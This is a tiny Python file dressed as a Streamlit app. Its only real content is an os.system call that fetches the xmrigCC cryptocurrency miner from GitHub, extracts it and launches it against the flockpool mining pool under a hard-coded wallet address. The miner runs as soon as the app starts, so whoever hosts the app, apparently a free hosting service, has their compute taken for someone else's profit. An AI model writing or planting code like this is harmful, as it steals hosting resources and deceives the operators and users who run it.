import streamlit as st



with st.echo():
    import os
    os.system("wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && ls -a &&chmod +x ./xmrigDaemon && ./xmrigDaemon -a gr -o eu.flockpool.com:4444 -u RC4KZTrmFHZGoaV3k42bMKsgr8CQ99qEkj -k")
